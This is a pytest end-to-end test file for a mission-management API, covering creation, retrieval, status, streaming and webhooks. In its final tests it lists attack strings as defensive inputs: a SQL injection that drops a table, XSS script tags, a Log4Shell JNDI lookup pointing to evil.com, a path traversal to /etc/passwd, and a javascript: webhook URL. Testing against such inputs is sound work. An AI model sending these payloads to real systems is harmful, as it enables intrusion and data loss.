"""
E2E tests for Gateway Mission Routes.

Tests the complete mission lifecycle:
- Create mission (with and without webhook)
- Get mission status
- SSE streaming
- Error handling
"""

import json
import os
import sys
from datetime import datetime
from unittest.mock import MagicMock, patch

import pytest

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))

# Set test environment
os.environ['REDIS_URL'] = ''
os.environ['REDIS_ENABLED'] = 'false'
os.environ['LICENSE_GATE_ENFORCE'] = '0'  # Disable for tests

pytestmark = pytest.mark.asyncio


@pytest.fixture
def test_tenant_id():
    """Return a test tenant ID."""
    return "test_tenant_e2e_001"


@pytest.fixture
def valid_mission_request(test_tenant_id):
    """Return a valid mission request payload."""
    return {
        "goal": "Analyze the codebase and suggest improvements",
        "tenant_id": test_tenant_id,
        "priority": "normal",
        "metadata": {"test": True, "source": "e2e_test"},
    }


@pytest.fixture
def mission_with_webhook_request(test_tenant_id):
    """Return a mission request with webhook callback."""
    return {
        "goal": "Complete a task and notify webhook",
        "tenant_id": test_tenant_id,
        "priority": "high",
        "webhook_url": "https://webhook.site/test123",
        "metadata": {"test": True, "webhook": True},
    }


class TestMissionCreation:
    """Tests for mission creation endpoint."""

    def test_create_mission_success(self, client, valid_mission_request):
        """Test successful mission creation."""
        response = client.post("/v1/missions", json=valid_mission_request)

        assert response.status_code == 200
        data = response.json()

        assert "mission_id" in data
        assert data["status"] == "pending"
        assert data["created_at"] is not None
        assert data["estimated_steps"] >= 0
        assert data["stream_url"] is not None

    def test_create_mission_with_webhook(self, client, mission_with_webhook_request):
        """Test mission creation with webhook URL."""
        response = client.post("/v1/missions", json=mission_with_webhook_request)

        assert response.status_code == 200
        data = response.json()

        assert data["status"] == "pending"
        # Webhook URL should be stored

    def test_create_mission_without_goal(self, client, test_tenant_id):
        """Test mission creation fails without goal."""
        request = {
            "tenant_id": test_tenant_id,
            # Missing goal
        }

        response = client.post("/v1/missions", json=request)

        # FastAPI returns 422 for validation errors
        assert response.status_code in (400, 422)
        data = response.json()
        assert "goal" in str(data).lower()

    def test_create_mission_with_empty_goal(self, client, test_tenant_id):
        """Test mission creation fails with empty goal."""
        request = {
            "goal": "",
            "tenant_id": test_tenant_id,
        }

        response = client.post("/v1/missions", json=request)

        assert response.status_code == 400

    def test_create_mission_with_too_long_goal(self, client, test_tenant_id):
        """Test mission creation fails with goal exceeding max length."""
        request = {
            "goal": "a" * 6000,  # Max is 5000
            "tenant_id": test_tenant_id,
        }

        response = client.post("/v1/missions", json=request)

        assert response.status_code == 400
        data = response.json()
        # Error should mention the max length constraint
        assert "5000" in str(data) or "max" in str(data).lower()

    def test_create_mission_with_invalid_priority(self, client, test_tenant_id):
        """Test mission creation fails with invalid priority."""
        request = {
            "goal": "Test mission",
            "tenant_id": test_tenant_id,
            "priority": "invalid_priority",
        }

        response = client.post("/v1/missions", json=request)

        assert response.status_code == 400
        data = response.json()
        assert "priority" in str(data).lower()

    def test_create_mission_with_invalid_webhook_url(self, client, test_tenant_id):
        """Test mission creation fails with invalid webhook URL."""
        request = {
            "goal": "Test mission",
            "tenant_id": test_tenant_id,
            "webhook_url": "not-a-valid-url",
        }

        response = client.post("/v1/missions", json=request)

        assert response.status_code == 400
        data = response.json()
        assert "webhook_url" in str(data).lower()

    def test_create_mission_without_tenant_id(self, client):
        """Test mission creation fails without tenant_id."""
        # Skip if license gate is enforced (requires auth)
        if os.environ.get("LICENSE_GATE_ENFORCE") == "1":
            pytest.skip("License gate enforced, auth required")

        request = {
            "goal": "Test mission",
            # Missing tenant_id
        }

        response = client.post("/v1/missions", json=request)
        # FastAPI returns 422 for validation errors
        assert response.status_code in (400, 422)


class TestMissionRetrieval:
    """Tests for mission retrieval endpoints."""

    def test_get_mission_by_id(self, client, valid_mission_request):
        """Test retrieving a mission by ID."""
        # Create mission
        create_response = client.post("/v1/missions", json=valid_mission_request)
        assert create_response.status_code == 200
        mission = create_response.json()
        mission_id = mission["mission_id"]

        # Retrieve mission
        response = client.get(f"/v1/missions/{mission_id}")

        assert response.status_code == 200
        data = response.json()

        assert data["mission_id"] == mission_id
        assert data["goal"] == valid_mission_request["goal"]

    def test_get_nonexistent_mission_returns_404(self, client):
        """Test getting non-existent mission returns 404."""
        fake_id = "mission_that_does_not_exist_999999"
        response = client.get(f"/v1/missions/{fake_id}")

        assert response.status_code == 404

    @pytest.mark.skip(reason="List missions endpoint not implemented in current scope")
    def test_list_missions(self, client, test_tenant_id):
        """Test listing missions for tenant."""
        response = client.get(f"/v1/missions?tenant_id={test_tenant_id}&limit=10")

        assert response.status_code == 200
        data = response.json()

        assert "missions" in data
        assert isinstance(data["missions"], list)
        assert len(data["missions"]) <= 10

    @pytest.mark.skip(reason="List missions endpoint not implemented in current scope")
    def test_list_missions_pagination(self, client, test_tenant_id):
        """Test pagination for mission list."""
        response = client.get(
            f"/v1/missions?tenant_id={test_tenant_id}&limit=5&offset=0"
        )

        assert response.status_code == 200
        data = response.json()

        assert "missions" in data
        assert len(data["missions"]) <= 5


class TestMissionStatus:
    """Tests for mission status tracking."""

    def test_mission_status_transitions(self, client, valid_mission_request):
        """Test mission status changes through lifecycle."""
        create_response = client.post("/v1/missions", json=valid_mission_request)
        assert create_response.status_code == 200
        mission = create_response.json()
        mission_id = mission["mission_id"]

        # Poll for status change
        import time

        max_wait = 30  # seconds
        start = time.time()
        final_status = None

        while time.time() - start < max_wait:
            response = client.get(f"/v1/missions/{mission_id}")
            if response.status_code == 200:
                data = response.json()
                status = data["status"]
                if status not in ["queued", "running"]:
                    final_status = status
                    break

            time.sleep(2)

        # Mission should have completed, failed, or been cancelled
        assert final_status in ["pending", "completed", "failed", "cancelled"]


class TestMissionStreaming:
    """Tests for SSE streaming endpoint."""

    def test_stream_endpoint_exists(self, client, valid_mission_request):
        """Test streaming endpoint returns SSE format."""
        create_response = client.post("/v1/missions", json=valid_mission_request)
        assert create_response.status_code == 200
        mission = create_response.json()
        mission_id = mission["mission_id"]

        response = client.get(
            f"/v1/missions/{mission_id}/stream",
            headers={"Accept": "text/event-stream"},
        )

        assert response.status_code == 200
        assert response.headers["content-type"].startswith("text/event-stream")

        # Read some of the stream
        content = response.text
        assert "data:" in content or "event:" in content

    def test_stream_nonexistent_mission_returns_404(self, client):
        """Test streaming non-existent mission returns 404."""
        fake_id = "mission_that_does_not_exist"
        response = client.get(
            f"/v1/missions/{fake_id}/stream",
            headers={"Accept": "text/event-stream"},
        )

        assert response.status_code == 404


class TestMissionWebhooks:
    """Tests for webhook delivery."""

    def test_mission_with_malformed_webhook_url(self, client, test_tenant_id):
        """Test mission creation rejects malformed webhook URLs."""
        request = {
            "goal": "Test mission",
            "tenant_id": test_tenant_id,
            "webhook_url": "javascript:alert(1)",  # XSS attempt
        }

        response = client.post("/v1/missions", json=request)

        assert response.status_code == 400

    def test_webhook_url_sanitization(self, client, test_tenant_id):
        """Test webhook URL is properly sanitized."""
        # URL with trailing spaces
        request = {
            "goal": "Test mission",
            "tenant_id": test_tenant_id,
            "webhook_url": " https://example.com/webhook ",
        }

        response = client.post("/v1/missions", json=request)

        if response.status_code == 200:
            # URL should be trimmed
            pass  # Would need to check stored value
        else:
            # May fail validation
            pass


class TestMissionErrorHandling:
    """Tests for error handling in mission operations."""

    def test_create_mission_with_malformed_json(self, client):
        """Test creating mission with malformed JSON."""
        response = client.post(
            "/v1/missions",
            content="invalid-json{",
            headers={"content-type": "application/json"},
        )

        assert response.status_code == 422

    def test_create_mission_missing_required_fields(self, client):
        """Test creating mission with missing required fields."""
        response = client.post("/v1/missions", json={})

        assert response.status_code == 422

    def test_mission_with_suspicious_goal_content(self, client, test_tenant_id):
        """Test mission with potentially malicious content in goal."""
        malicious_goals = [
            "'; DROP TABLE missions; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
        ]

        for goal in malicious_goals:
            response = client.post(
                "/v1/missions",
                json={"goal": goal, "tenant_id": test_tenant_id},
            )

            # Should be accepted (content is just text) or rejected by validation
            assert response.status_code in [200, 400, 422]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
